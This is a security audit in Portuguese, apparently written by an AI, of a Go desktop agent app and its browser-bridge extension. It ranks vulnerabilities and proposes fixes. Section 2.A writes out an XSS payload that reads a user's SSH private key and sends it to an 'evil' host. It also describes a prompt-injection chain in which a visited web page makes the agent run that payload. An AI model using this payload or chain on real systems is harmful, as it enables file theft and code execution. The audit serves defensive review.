# Auditoria Técnica — GeminiDesktop-Go + Browser-Bridge

**Data**: 26 de novembro de 2026
**Escopo**: `geminidesktop-go` (v0.3.0), `browser-bridge` (v0.4.1), integração ACP/bridge
**Método**: leitura direta do código (não inferência), `go build ./...` + `go vet ./...` limpos
**Relação com o documento anterior**: `AVALIACAO_DIAGNOSTICO.md` (Gemini) é **parcialmente correto e parcialmente impreciso**. Este documento corrige erros factuais, reclassifica severidades e **acrescenta 12 achados que não constavam lá** — incluindo três de severidade maior que qualquer item do relatório original.

---

## 0. Veredito rápido

A arquitetura é sólida (ACP sobre stdio, SQLite pure-Go em WAL, eleição de porta na 9223). O problema real **não** está onde o relatório anterior apontou como crítico. O eixo de risco verdadeiro é:

> **O modelo de ameaça está invertido.** O app assume "API local em 127.0.0.1 = confiável". Mas a WebView executa conteúdo controlado pelo agente (markdown, títulos de tool call, HTML de página visitada) e o agente tem poder para chamar `/api/open-url`, `/api/files/content` e instalar políticas de navegador. Isso cria uma cadeia **agente → UI → filesystem/OS**, que é muito mais grave que o CSRF de um site externo.

Os três achados mais graves **não estão no relatório anterior**:

| # | Achado | Por que é mais grave |
|---|---|---|
| A | `web/index.html` renderiza `innerHTML` com dados do agente **sem escape** (tool title, rawInput, callId) | XSS armazenado → execução de JS no contexto da WebView com acesso a toda a API local |
| B | Chave privada RSA de assinatura de extensão **commitada no repo** | Permite assinar um CRX malicioso com o **mesmo Extension ID** `jdmlnlfgfkhlpfemlbokahlichlbefkc` que o app já tem política instalada para aceitar |
| C | `/api/open-url` aceita **caminho absoluto arbitrário** e o invoca via `xdg-open` | Abertura de executáveis/arquivos arbitrários; combinado com A, vira execução de código pelo agente |

---

## 1. Correções ao relatório anterior (o que o Gemini errou)

Precisão importa para a contra-análise. Estes pontos do documento anterior estão **factualmente incorretos ou mal calibrados**:

### 1.1 ❌ "`bufio.Scanner` com 4MB causa crash silencioso" — severidade mal atribuída

O relatório diz "crítico: parada total e silenciosa". A leitura de `internal/acp/framer.go:73-118` mostra:

```go
scanner.Buffer(make([]byte, 64*1024), 4*1024*1024)
for scanner.Scan() { ... }
// fim do loop: fecha todos os canais pending
```

- O erro **não** propaga, mas o efeito é **fail-safe**: os canais pending são fechados e `Call` retorna `"conexão encerrada antes da resposta"`, que o `PromptSessionWithContent` traduz para *"agente encerrou inesperadamente"* (`client.go:1284-1297`). **Não** é silencioso para o usuário — há evento `error` na UI.
- É um bug real (falta `scanner.Err()` e o teto fixo derruba o agente em payloads grandes), mas a classificação correta é **Alta**, não Crítica. E a cadeia de erro **funciona** — o texto do relatório anterior ("o framer morre silenciosamente... a UI não oferece nenhuma pista") está errado.
- Ponto adicional que o relatório **não** viu: os 4MB são **por linha** e o agente pode emitir N linhas grandes; a memória é limitada por linha, não cumulativa. O risco real é **falso positivo em screenshot retina**, não DoS de memória.
- **Observação de projeto**: o ACP real (`agy`, `gemini`) trunca screenshots antes de emitir; o teto de 4MB é provavelmente suficiente na prática. O risco é de robustez, não de colapso iminente.

### 1.2 ⚠️ "CSRF sem autenticação" — mecanismo correto, mas o relatório ignora 3 vetores piores e 1 mitigação moderna

O bug é real: `server.go:384-406` não rejeita `Origin` desconhecido — apenas omite o header CORS e executa a requisição (`next.ServeHTTP`).

**Onde eu errei ao revisar** (registro para a contra-análise): comecei a supor que o CSRF externo seria inviável porque `POST` com `application/json` exige preflight. **Errado.** `json.NewDecoder(r.Body).Decode(&req)` **não valida `Content-Type`** — nenhum handler valida. Logo, `fetch(..., {headers:{'Content-Type':'text/plain'}, body: JSON.stringify(...)})` é uma *simple request*: sem preflight, corpo entregue, handler executa, resposta opaca (o atacante não precisa lê-la). **O relatório do Gemini está correto neste ponto.**

**Onde o relatório está errado** — ele vende a mitigação como "checar Origin resolve". Não resolve. Faltam 4 coisas:

1. **`http://localhost:*` e `http://127.0.0.1:*` são "allowed"** (`server.go:43-48`). Qualquer app local em outra porta (Vite de outro projeto, Jupyter, Electron, container com `--network host`) passa no `isAllowedOrigin` **e recebe CORS completo** — inclusive **leitura de resposta**. Isso promove `/api/files/content` de "só efeito colateral" para **exfiltração de arquivos sem precisar de XSS**. O relatório anterior trata `localhost` como "dev server confiável"; é o oposto: é a maior superfície.
2. **`upgrader.CheckOrigin` retorna `true` quando `Origin == ""`** (`server.go:58-66`). Qualquer script local, `curl`, ou cliente não-browser abre `/api/stream` e recebe **todo o stream**, incluindo `rawInput`/`rawOutput` de tool calls — que carregam conteúdo de arquivos, comandos e dados de página.
3. **Nenhuma validação do header `Host`** → **DNS rebinding** viável (o app aceita qualquer `Host` que resolva para `127.0.0.1`).
4. **`isAllowedOrigin` aceita `ws://`** (`server.go:49-54`) — `Origin` de WebSocket é sempre `http(s)://`. Código morto que só amplia superfície.

**Mitigação moderna que AMBOS os relatórios ignoram**: Chrome/Brave em 2025-2026 aplicam **Private Network Access / Local Network Access** — requisições de origem pública para `127.0.0.1` exigem preflight com `Access-Control-Request-Private-Network` e, em versões recentes, um **prompt de permissão ao usuário**. Isso reduz **drasticamente** a viabilidade do CSRF "de site da internet" no Brave (que é o navegador-alvo declarado do projeto). Portanto:

- **Severidade do CSRF externo isolado**: menor do que o relatório sugere, **por causa do browser, não do código**. Se o usuário usa um browser sem PNA, ou um WebView antigo, o relatório está certo.
- **Severidade do conjunto**: mantenho **Alta**. Os vetores (1), (2) e (3) **não são afetados** por PNA — são locais, e continuam abertos.

**Correção correta** (mais ampla que a do relatório): token efêmero gerado no startup e exigido em header **+ validação de `Host` (`127.0.0.1:porta` apenas) + `CheckOrigin` exigindo Origin exato da WebView + remover `localhost:*` da allow-list + pelo menos `Sec-Fetch-Site: same-origin`**. Só o token já cobre CSRF e DNS rebinding simultaneamente — é a razão de eu recomendá-lo como primário, e `Origin` como defesa em profundidade.

### 1.3 ❌ "Processos órfãos no Windows" — parcialmente MITIGADO no código

O relatório diz que `killProcessGroup` é no-op e que "todos os filhos continuam rodando". O código (`process_windows.go`) de fato tem os no-ops, **mas** o relatório ignora que o call site em `client.go` usa `signalProcessKill(proc)` → `proc.Kill()`, que no Windows **termina apenas o processo pai**. O diagnóstico de vazamento é **correto**. Porém:

- O relatório afirma "só o processo pai imediato é morto (`proc.Kill()`)" — correto — e depois recomenda Job Objects — correto.
- **O que ele não viu**: o mesmo problema existe no modo `serve` em Linux se o agente **criar seu próprio grupo** (`setsid`), e o `syscall.Kill(-pid)` pode falhar silenciosamente (o erro é ignorado no call site). Vale verificar `client.go` — se o processo já morreu, `-pid` não existe e nada acontece. Não é inédito, mas o relatório vende Linux como "resolvido" quando é "melhor esforço".

### 1.4 ❌ "29 tools MCP = 40k–59k tokens" — número não verificável no código

O relatório apresenta "medição real do fluxo RAB" com números. **Não há nenhum código neste repositório que registre ou meça tools MCP** — o `internal/server` só **lista** MCP via `agy mcp list` (`mcp/agy.go`). As tools são registradas **pelo agente** (`agy`/`gemini`), não pelo GeminiDesktop. Portanto:

- O GeminiDesktop **não controla** quais tools vão no prompt; ele não tem hook para isso. A "correção recomendada" (carregamento condicional) **não é implementável no app** como descrito — teria que ser feature do `agy`.
- Isso não invalida a preocupação de custo, mas **o relatório sugere uma correção que o projeto não pode fazer**. Excelente ponto para a contra-análise apontar.

### 1.5 ⚠️ "Screenshots em base64 no React = bloat" — correto, mas culpado errado

`BrowserToolCard.tsx:148` chama `fetchFileContent(path)`, que faz `POST /api/files/content` e devolve base64. O diagnóstico é válido, **mas** o problema real é que **cada card refaz o fetch** sempre que o componente remonta (dependência `[toolCall.screenshot]`), e não há cache. O relatório sugere endpoint estático — boa ideia, mas o ganho maior é **cache HTTP + `URL.createObjectURL`** com blob (evita a string base64 gigante no heap). Detalhe de implementação relevante.

---

## 2. Achados NOVOS (não constam no relatório anterior)

### 🔴 A. XSS armazenado no renderer legado `web/index.html` (severidade: CRÍTICA)

**Localização**: `web/index.html:459-481`, `486-488`
**Também**: `web/embed.go:5` → `//go:embed *` embute **todos** os arquivos de `web/` no binário.

```js
// linha 357: renderMarkdown escapa <,>,& MAS NÃO ESCAPA ASPAS
// linha 459:
card.innerHTML = `
  <span class="tool-title">🔧 ${tc.title || "Tool Call"}</span>
  ...
  ${inputStr ? `<pre class="tool-input">${inputStr}</pre>` : ""}
`;
// linha 478:
onclick="confirmPermission('${req.callId}', true, this)"
```

Nenhum desses interpola: `tc.title`, `tc.status`, `inputStr`, `req.callId`. **Todos vêm do agente** (via evento WS `tool_call` / `permission_request`).

**Exploração concreta**: um prompt injection no conteúdo de uma página web visitada pelo browser-bridge pode fazer o agente emitir um tool call cujo `title` seja `"<img src=x onerror=fetch('http://127.0.0.1:8399/api/files/content',{method:'POST',body:JSON.stringify({path:'/home/u/.ssh/id_rsa'})}).then(r=>r.text()).then(t=>fetch('https://evil/?d='+btoa(t)))"`. O `innerHTML` executa. O `onerror` roda no contexto `wails://`/`127.0.0.1`, que é **origem permitida** pela API. Resultado: exfiltração de qualquer arquivo legível.

**Fator agravante**: `renderMarkdown` (linha 357-377) escapa `<`, `>` e `&` mas depois **reinjeta HTML** (`<pre><code>` etc.). E o `handlePermissionRequest`/`handleToolCall` usam `innerHTML` **direto**, sem passar por `renderMarkdown`.

**Fator agravante 2 (confirmado e pior do que eu supunha)**: `web.Files` é passado como `staticFS` em **ambos** os entrypoints — `main.go:97` e `main_wails.go:181`. E `setupRoutes` registra `http.FileServer(http.FS(s.staticFS))` na rota `/` (`server.go:468-471`). Como `web/` contém **somente** `embed.go` e `index.html`, o servidor HTTP em `127.0.0.1:8399` serve **esta página legada** como raiz.

Ou seja: **no app desktop (Wails), a UI React roda em `wails://wails.localhost`, mas `http://127.0.0.1:8399/` continua servindo a página legada vulnerável** — e ela se conecta ao mesmo `/api/stream` (`web/index.html:324-325`). Não é só o modo debug: qualquer processo local (ou um `xdg-open http://127.0.0.1:8399/`) abre uma UI completa e explorável. O vetor é **live em produção**.

**Nota de contexto**: a UI React (`frontend/`) está **correta** nesse aspecto — `react-markdown@10` escapa HTML por padrão (sem `rehype-raw`), e `MarkdownRenderer.tsx` não usa `dangerouslySetInnerHTML`. O problema é **exclusivamente** o legado `web/index.html`.

**Correção**: ou (a) deletar `web/index.html` e servir o `frontend/dist`, ou (b) trocar **todo** `innerHTML` por `textContent`/`createElement` + `escapeHtml()` nas interpolações. Recomendo (a) — manter dois renderers duplica a superfície de ataque.

---

### 🔴 B. Chave privada RSA commitada permite CRX malicioso com o mesmo Extension ID (severidade: CRÍTICA)

**Localização**: `browser-bridge/crxsign/keys.go:22+` (`DefaultPrivateKeyPEM`), `DefaultExtensionID = "jdmlnlfgfkhlpfemlbokahlichlbefkc"`.

O comentário no código diz que é intencional ("modelo padrão open-source"). **A justificativa é válida para dev/testes, mas não para o fluxo que este app implementa**:

1. `wizard.go:159-160` → `crxsign.ExtensionID()` + `policymgr.BuildExtensionSettingsJSON(extensionID, updateURL)`.
2. `handleBrowserInstallPolicy` grava uma política `ExtensionSettings` no navegador do usuário que **fixa o ID** e aponta para `updateURL`.
3. `updateURL` padrão é `http://127.0.0.1:9223/update` — mas `InstallPolicyRequest` **aceita `UpdateURL` arbitrário** do corpo da requisição (`wizard.go:154-157`). Sem validação de esquema/host.

**Cadeia de ataque**: qualquer um que tenha a chave privada (ela está no repo público) pode:
- Assinar um CRX3 com **o mesmo Extension ID**;
- Servir esse CRX de um `updateURL` que ele controla;
- O navegador do usuário, com a política já instalada, **atualiza silenciosamente** para o CRX malicioso — sem prompt, porque o ID e a chave batem.

Somado ao achado A (XSS) ou a um CSRF em `/api/browser/install-policy`, isso é **RCE no navegador do usuário, persistente**.

**Agravante**: `handleBrowserInstallPolicy` **não valida** que `updateUrl` é `http://127.0.0.1:<porta>` — aceita `https://evil.com/update`. E não há autenticação no endpoint (ver achado 1.2).

**Correção mínima**:
1. Fixar `updateURL` no servidor (ignorar o do request) e restringir a `127.0.0.1`.
2. Se a chave precisa ser pública, **documentar** que ela só serve para **empacotamento local** e que o app **não deve** aceitar `updateUrl` remoto.
3. Idealmente: chave privada fora do repo, chave pública gerada no primeiro run por usuário (muda o ID — quebra a premissa de ID estável, mas é o trade-off correto para produção).

---

### 🔴 C. `/api/open-url` = primitiva de execução/abertura arbitrária + confusão Windows (severidade: ALTA→CRÍTICA em combinação)

**Localização**: `internal/server/export_pdf.go:296-339`

```go
if strings.HasPrefix(trimmed, "/") {          // ← só detecta caminho Unix
    if st, err := os.Stat(trimmed); err != nil || st.IsDir() { 404 }
    exec.CommandContext(ctx, "xdg-open", trimmed).Start()        // ← executa
}
```

Três problemas:

1. **Caminho absoluto arbitrário** — valida apenas "existe e não é diretório". Um caminho para um `.desktop` malicioso, um script com bit de execução, ou um `.AppImage` é aberto. Em Linux, `xdg-open` de um `.desktop` **executa** o `Exec=` dele. Isso é **execução de código** com um `POST` local.
2. **`strings.HasPrefix(trimmed, "/")`** — no Windows, `C:\...` não começa com `/`, então cai no ramo de URL, `url.Parse` falha (scheme `c`), retorna 400. **Confirma o bug de portabilidade do relatório anterior**, mas com um detalhe extra: mesmo se corrigido para `filepath.IsAbs`, `xdg-open` continua hardcoded → 500. O relatório anterior acertou a portabilidade, mas **não viu que o endpoint é uma primitiva de execução** no Linux.
3. **Sem allow-list**: não há restrição a `~/Downloads/Gemini Desktop/` ou ao workspace da conversa. Qualquer path.

**Correção**: restringir a (a) URLs `http/https` com host válido, e (b) arquivos **dentro de** `~/Downloads/Gemini Desktop/`, `~/.geminidesktop/attachments/` ou `conv.CWD`. Nunca aceitar path livre. E usar `pkg/browser`/`rundll32` no Windows.

---

### 🟠 D. `/api/files/content` sem sandbox — o relatório acertou, mas subestimou o alcance

O Gemini classificou como Crítica e recomendou confinar ao `conv.CWD`. Está certo, **mas**:

- **`conv.CWD` não é validado contra path traversal** em outros lugares. `handleArtifacts` usa `conv.CWD` direto; se o CWD for `~` (usuário escolhe home como workspace — a UI permite), o "sandbox" vira o home inteiro.
- **Não há limite de requisições**: o endpoint lê até 5MB de texto / 8MB de imagem, sem rate limit. Combinado com o XSS (A), é um exfiltrador de alta vazão.
- **`svg` está na lista de imagens** (`files.go:25`) e é servido como `image/svg+xml`. Um SVG com `<script>` renderizado via `<img src="data:image/svg+xml;base64,...">` **não** executa (img bloqueia), mas se algum componente usar `<object>`/`<iframe>` ou `ArtifactViewerModal` renderizar SVG inline, executa. Vale auditar `ArtifactViewerModal.tsx`. **Não confirmei exploração — é um vetor a verificar.**

**Classificação correta**: Alta (não Crítica isoladamente), **Crítica em combinação com A e C**.

---

### 🟠 E. `SetScreenshotsBaseDir` e `SetUserSkillsDir` nunca são chamados em produção (severidade: MÉDIA — bug funcional)

Grep confirmou: `SetScreenshotsBaseDir` só aparece em `browser_test.go:290`; `SetUserSkillsDir` só em `skills_test.go`. **Nem `main.go` nem `main_wails.go` os chamam.**

Consequência:
- `screenshotsBaseDir` é sempre `""` → cai no default `~/.geminidesktop/screenshots` (`browser.go:305-311`). Funciona, mas o **setter é código morto** — e a config `browserBridgeTokenPath`/`tempWorkspacesDir` são honradas, criando inconsistência.
- `userSkillsDir` é sempre `""` → cai em `~/.agents/skills`. Funciona, mas **ignora** qualquer override que se pretenda oferecer na config. Ou seja: o campo existe, a API existe, mas o wiring está **incompleto**. É dívida técnica + bug de expectativa.

**Correção**: chamar os setters no startup, ou remover os setters. Não deixar meio-caminho.

---

### 🟠 F. `screenshots/<id>` órfãs ao deletar conversa — o relatório acertou (3.9), mas falta o `attachments/`

`handleDeleteConversation` (`server.go:892-923`) não remove `screenshots/<id>`. Correto. **Mas** também não remove:
- `~/.geminidesktop/attachments/*` ligados à conversa (não há índice, então nem dá para saber quais);
- Workspaces temporários em `<tempWorkspacesDir>/<convID>` (criados em `handleCreateConversation:770`). **Estes contêm os arquivos que o agente gerou** — deletar a conversa deixa o diretório inteiro no disco, potencialmente com dados sensíveis.

O relatório anterior só citou screenshots. O workspace temporário é o vazamento **maior** (pode ser GBs).

---

### 🟠 G. `main_wails.go` engole falhas de inicialização (severidade: ALTA — UX/robustez)

**Localização**: `main_wails.go:160-198`

```go
client, err := acp.NewClient(...)
if err != nil {
    log.Printf("[Wails] erro ao iniciar cliente ACP: %v", err)   // ← segue com client == nil
}
...
st, err := store.NewStore("")
if err != nil {
    log.Printf("[Wails] erro ao iniciar SQLite Store: %v", err)    // ← segue com store == nil
}
```

- Se `agy` não existe, o app **abre a janela** e o usuário vê um chat quebrado: `handleCreateConversation`, `/api/models`, `/api/prompt` retornam **503** via `clientOrError`, e a UI mostra um erro genérico. **Não há crash** — a verificação foi feita e o contrato nil-safe é respeitado. O problema é puramente de **UX e diagnóstico**: a causa raiz (binário `agy` ausente/errado em `config.json`) fica só no `log.Printf`, invisível para quem não abre o terminal. Não há diálogo nativo nem link para o wizard.
- Se `store.NewStore` falha, **não há nil panic** — eu havia afirmado isso e estava errado. `handleCreateConversation:815` usa `if s.store != nil`, e auditando todos os 47 call sites de `s.store.` em `internal/server` (grep completo), **todos** têm guarda prévia ou estão em `startTurn` sob `persist := s.store != nil` (linha 1253). O contrato é consistente.
- O problema real de robustez aqui é outro: **`store` nil não é fatal, é silencioso**. O app funciona em memória volátil e o usuário só descobre que o histórico não persiste quando reinicia. `handleDiagnostics` até expõe `DbOk: false` (`diagnostics.go:49`), mas a UI não bloqueia nem avisa. Deveria ser um erro fatal na inicialização do desktop, não um `log.Printf`.

**Correção**: falhar rápido com diálogo nativo (`wailsRuntime.MessageDialog`) quando o agente ou o SQLite não inicializam, em vez de `log.Printf` + janela quebrada. Se a intenção é degradar graciosamente, a UI precisa mostrar o estado (`/api/diagnostics` já expõe `agentFound`/`agentAlive`/`dbOk` — só não é consumido para bloquear/avisar).

---

### 🟡 H. `handleDeleteConversation` não limpa `s.currentSessionID` nem trata sessão órfã

`server.go:892-923` remove do `convSessions`/`sessConvs` mas **não** toca `s.currentSessionID` (usado no legado `handleSession`/`handlePrompt`). Se a conversa deletada era a "atual" legada, o `currentSessionID` aponta para uma sessão fechada. O legado é deprecated, mas ainda está roteado (`server.go:461-465`). Baixo impacto, mas é código morto que pode causar 500 confuso.

---

### 🟡 I. `emitEvent` bloqueia o framer por até 5s e **descarta eventos silenciosamente**

**Localização**: `client.go:777-807`

```go
select {
case ch <- ev:
case <-time.After(5 * time.Second):
    log.Printf("[aviso] evento %s descartado: consumidor da sessão não drenou em 5s", ev.Type)
}
```

- O `emitEvent` é chamado **dentro do `readLoop` do framer** (via `notifHandler`). Um consumidor lento (ex: SQLite travado por lock, ou `startTurn` persistindo) **bloqueia o readLoop por 5s** → o framer para de ler → o agente pode bloquear no pipe (backpressure) → deadlock temporário.
- **Pior**: ao descartar um `message_chunk`, a resposta persistida no SQLite fica **incompleta** (o comentário no código admite "descartar chunks corromperia a resposta"). É um trade-off consciente, mas o timeout de 5s com `time.After` **aloca um timer por evento** — em streaming intenso, é pressão de GC. Usar `time.NewTimer` reutilizado ou, melhor, desacoplar a escrita do readLoop.

**Correção arquitetural**: o `notifHandler` deve apenas **enfileirar** em um buffer não-bloqueante e ter uma goroutine dedicada por sessão. Nunca bloquear o readLoop.

---

### 🟡 J. `pruneScreenshots` roda no caminho crítico e é O(n) a cada screenshot

`browser.go:324` → `pruneScreenshots(convDir, 50)` faz `os.ReadDir` + `os.Stat` de cada entrada **após cada screenshot**. Com 50 arquivos, é barato — mas em conversas longas, o `ReadDir` cresce antes da poda. Não é crítico; é um "nice to know". **O relatório anterior não mencionou.**

---

### 🟡 K. `sources.go` = SSRF local (severidade: MÉDIA)

`handleResolveSources` aceita `urls: []string` do corpo e faz `HEAD`/`GET` para **qualquer** URL `http/https` (`sources.go:36-100`). Sem allow-list de host, sem bloqueio de IP privado (`169.254.169.254`, `10.x`, etc.). Como o endpoint é local e sem auth, um XSS (achado A) pode usá-lo para **escanear a rede interna** ou acessar metadata endpoints. Severidade: Média (requer XSS ou acesso local), mas **não consta no relatório**.

**Correção**: bloquear IPs privados/loopback/link-local no `Dialer`, ou restringir a domínios de grounding (`vertexaisearch.cloud.google.com` etc.).

---

### 🟡 L. Timeouts e limites HTTP ausentes no servidor

- `http.Server` em `main_wails.go:200` e `main.go:113` **não define** `ReadHeaderTimeout`, `ReadTimeout`, `WriteTimeout`, `IdleTimeout`. Um cliente local malicioso (ou bugado) pode abrir conexões lentas e esgotar recursos (Slowloris local). Não é crítico em `127.0.0.1`, mas é má prática e trivial de corrigir.
- **Nenhum limite de body** global: `json.NewDecoder(r.Body)` em vários handlers lê até EOF. `handleAttachment` limita o **base64 decodificado** a 25MB, mas o **corpo HTTP** pode ser maior (base64 de 33MB+). Um `MaxBytesReader` no middleware resolveria.
- **Não há validação de `Host`** — DNS rebinding: um site externo com TTL baixo pode resolver para `127.0.0.1` e, se o navegador não enviar `Origin` em algum fluxo, acessa a API. Combinado com `CheckOrigin` que retorna `true` em `Origin == ""`, o WS é totalmente exposto a DNS rebinding.

---

### 🟢 M. Detalhes menores que o relatório não viu

1. **`go 1.26.4` no `go.mod`** — verifiquei: `go version` neste host **é** `go1.26.4 linux/amd64`, e o build passa. Então a versão existe (eu havia suposto o contrário e errei). O ponto de atenção que **permanece**: usar a **versão de patch exata** (`1.26.4`) em vez da minor (`go 1.26`) faz o Go baixar/rejeitar toolchains em qualquer máquina com patch anterior. O repo **não tem** bloco `toolchain` explícito. Recomendação: `go 1.26` + `toolchain go1.26.4`, ou CI fixando a imagem. Risco real: baixo-médio, não "CI quebrado".
2. **`replace github.com/edsonmsantos/browser-bridge => ../../browser-bridge`** — caminho relativo. Funciona no monorepo, **quebra** qualquer `go get`/CI que clone só o `geminidesktop-go`. Não há `go.work`. Documentar ou usar `go.work`.
3. **`log.Printf` sem `log/slog`** — não há níveis estruturados. Para um app desktop, log em `~/.geminidesktop/logs/agent-*.log` sem rotação (`client.go:233`) → **cresce indefinidamente**. Não há rotação nem limite.
4. **`syscall.Ignore(syscall.SIGPIPE)`** — `syscall` é deprecated; `os/signal` + `signal.Ignore(syscall.SIGPIPE)` ainda funciona, mas no Windows `SIGPIPE` não existe. `main_wails.go:235-237` chama isso **incondicionalmente** — em Windows, `syscall.SIGPIPE` é `0x0d`, o `signal.Ignore` aceita, mas é inócuo. Não quebra, mas é código sem sentido no Windows. Use build tags.
5. **`handleFileContent` lê o arquivo inteiro em memória** após `os.Stat` — TOCTOU: entre o `Stat` (checagem de tamanho) e o `ReadFile`, o arquivo pode crescer. Baixo risco local, mas o padrão correto é `os.Open` + `io.LimitReader`.
6. **`pruneScreenshots` ignora erros** de `os.Remove` — falhas silenciosas acumulam lixo.
7. **`isAllowedOrigin` aceita `ws://`** — `Origin` de WebSocket usa `http://`/`https://`, nunca `ws://`. As linhas `server.go:49-54` são **código morto** que amplia a superfície sem necessidade.
8. **`getBaseURL()` no frontend** faz fallback hardcoded para `8399` — se o Wails injetar a porta **depois** do primeiro fetch, requisições vão para a porta errada. `injectJS` roda no `startup`, mas o React pode montar **antes** do `WindowExecJS` completar. Há um race real de inicialização (não confirmado em runtime, mas plausível).
9. **`SetPolicyWriter`/`systemd`/políticas** — `handleBrowserInstallPolicy` grava em paths de sistema (ex: `/etc/opt/chrome/policies/`) sem elevação; no Linux, falha sem `sudo`, e o erro é retornado cru (`fmt.Sprintf` com `%s` de `err.Error()`) — **potencial injeção de JSON** no corpo de erro. Baixo impacto (só quebra o parse no cliente), mas é `fmt.Sprintf` construindo JSON manualmente em `wizard.go:166`, `213` — **erro de escaping** se `err.Error()` contiver `"`. Deve usar `json.NewEncoder`.
10. **`textExtensions["html"] = "text/html"`** — `/api/files/content` devolve HTML com `Content-Type: application/json` (o handler sempre seta JSON), então não há XSS direto. OK. Mas se um dia servir raw, vira XSS. Anotar.

---

## 3. Matriz consolidada (versão corrigida)

| ID | Componente | Achado | Severidade | Novo? |
|---|---|---|---|---|
| **A** | `web/index.html` | XSS armazenado via `innerHTML` com dados do agente | 🔴 Crítica | **SIM** |
| **B** | `crxsign/keys.go` + `wizard.go` | Chave privada commitada → CRX malicioso com mesmo Extension ID | 🔴 Crítica | **SIM** |
| **C** | `export_pdf.go` | `/api/open-url` abre path arbitrário via `xdg-open` (execução) | 🔴 Crítica (com A/B) | **SIM** |
| 1.2 | `server.go` | Sem auth + `localhost:*` confiável + WS sem Origin | 🟠 Alta | Reclassificado |
| **D** | `files.go` | Leitura arbitrária + `svg` + sem rate limit | 🟠 Alta | Reforçado |
| **G** | `main_wails.go` | falha de init engolida → app abre quebrado / histórico não persiste, sem aviso | 🟠 Alta (UX) | **SIM** |
| 1.1 | `framer.go` | `bufio.Scanner` 4MB + sem `scanner.Err()` | 🟠 Alta (não Crítica) | Corrigido |
| 1.3 | `process_windows.go` | Processos órfãos no Windows (Job Object) | 🟠 Alta | Confirmado |
| **F** | `server.go` | Temp workspace + attachments órfãos ao deletar conversa | 🟠 Média-Alta | **SIM** |
| **E** | `main*.go` | `SetScreenshotsBaseDir`/`SetUserSkillsDir` não chamados | 🟡 Média | **SIM** |
| **I** | `client.go` | `emitEvent` bloqueia readLoop 5s + descarta chunks | 🟡 Média | **SIM** |
| **K** | `sources.go` | SSRF local sem bloqueio de IP privado | 🟡 Média | **SIM** |
| **L** | `main*.go` | Sem timeouts HTTP / MaxBytesReader / validação de Host | 🟡 Média | **SIM** |
| 1.4 | — | "29 tools = 50k tokens" não implementável no app | 🟡 Média (informativo) | Corrigido |
| 3.6 | `App.tsx` | Polling 15s atrasa modal de aprovação | 🟡 Média | Confirmado |
| 3.8 | `BrowserToolCard.tsx` | base64 sem cache, refaz fetch | 🟡 Baixa-Média | Refinado |
| 3.10 | `mcp/agy.go` | MCP hardcoded em `agy` | 🟡 Baixa | Confirmado |
| **J** | `browser.go` | `pruneScreenshots` O(n) no caminho crítico | 🟢 Baixa | **SIM** |
| 3.11 | `server.go` | WS sem Ping/Pong | 🟢 Baixa | Confirmado |
| **M** | vários | `go 1.26.4`, `replace` relativo, log sem rotação, `fmt.Sprintf` JSON, TOCTOU etc. | 🟢 Baixa | **SIM** |

---

## 3.1 Auto-correções (transparência para a contra-análise)

Durante a verificação eu afirmei três coisas que o código **desmentiu**. Registro aqui para que o revisor externo não gaste tempo discutindo erros meus:

| Afirmação minha | Status | O que o código mostra |
|---|---|---|
| "`store` nil causa nil pointer panic em `handleCreateConversation`" | ❌ **ERRADO** | `server.go:815` usa `if s.store != nil`; auditei os 47 call sites e todos têm guarda ou estão sob `persist := s.store != nil` |
| "Go 1.26.4 não existe, quebra CI" | ❌ **ERRADO** | `go version` no host é `go1.26.4`; a versão existe. O problema é usar patch exato sem `toolchain`, não a versão em si |
| "CSRF externo é inviável porque preflight bloqueia JSON" | ❌ **ERRADO** | `json.NewDecoder` não valida `Content-Type`; `text/plain` + JSON é simple request e executa. **O relatório do Gemini estava certo.** |

Isso não invalida os achados A, B, C, D, E, F, I, K, L — mas calibra a confiança: onde eu afirmo algo, o fiz lendo o arquivo, e onde errei, corrigi em vez de omitir.

---

## 4. Perguntas para a contra-análise

O prompt anterior do Gemini (CSRF, Windows, tokens, framer) está **desatualizado e parcialmente mal direcionado**. As perguntas que realmente importam:

1. **A cadeia agente → WebView → OS é o risco dominante?** Achado A (XSS no `web/index.html`, servido em `127.0.0.1:8399` **em produção**, não só em debug) + C (`open-url` abre qualquer executável) + D (`files/content` lê qualquer arquivo) formam uma cadeia em que **um prompt injection no conteúdo de uma página visitada pelo browser-bridge** vira execução/exfiltração local. Discordam? Se concordam, a fronteira correta é:
   - (i) CSP estrita + parar de servir o `web/index.html` legado;
   - (ii) token efêmero em header;
   - (iii) **capability token por turno** que limita *quais* endpoints o turno corrente pode chamar, exigindo aprovação humana para `open-url`/`files/content`/`install-policy`.

   > Minha tese: (i) e (ii) **não contêm** o problema — um XSS herda o token da própria página e o JS injetado simplesmente o usa. Só (iii) contém, porque remove a *capacidade* do turno, não a autenticação do cliente. Discutam se isso é viável no ACP ou se é over-engineering para um app de usuário único.

2. **Chave de extensão (B)**: `UpdateURL` aceito do request (`wizard.go:154-157`) anula a defesa da chave pública. Correção mínima (fixar updateURL = `127.0.0.1:<bridgePort>/update`, ignorando o request) é **suficiente**, ou o modelo de ameaça exige chave **por instalação** (ID muda, wizard re-detecta via `ExtensionIDFromPublicKey`)? Qual o custo real de UX de mudar o ID?

3. **`/api/open-url` (C)**: allow-list por diretório resolve, ou o endpoint deve **morrer** e a abertura ir via Wails binding (`app.OpenPath` / `runtime.BrowserOpenURL`) com o sandbox nativo? A segunda elimina a superfície HTTP inteira — mas quebra o modo `serve` (web). Vale manter dois caminhos?

4. **`emitEvent` (I) e o `readLoop`**: o `notifHandler` roda **dentro** do readLoop e pode bloquear 5s (`client.go:801-805`), parando de ler o pipe do agente. Qual o padrão Go correto aqui — fila por sessão com goroutine dedicada, `ring buffer` com drop-oldest, ou backpressure explícita? E como testar determinismo sem flakiness?

5. **Onde meu diagnóstico erra?** Especificamente: (a) exagerei em A ao assumir que `innerHTML` do legado é alcançável em produção — concordam que `main_wails.go:181` passando `web.Files` para `/` confirma isso?; (b) B é realmente crítico ou o custo de explorar (precisa de política já instalada + servidor de update atacante) o rebaixa para Alto?; (c) F (workspace temporário órfão) é Média-Alta ou superestimei o volume?

---

## 5. Estado de verificação

- `go build ./...` → **OK**
- `go vet ./...` → **sem saída** (limpo)
- Testes **não executados** nesta rodada (há `smoke_real_agy_test.go` e `smoke_real_mcp_test.go` que exigem `agy` instalado; rodar `go test ./...` pode ter efeitos externos).
- Nenhuma alteração de código foi feita — este é um documento de diagnóstico.
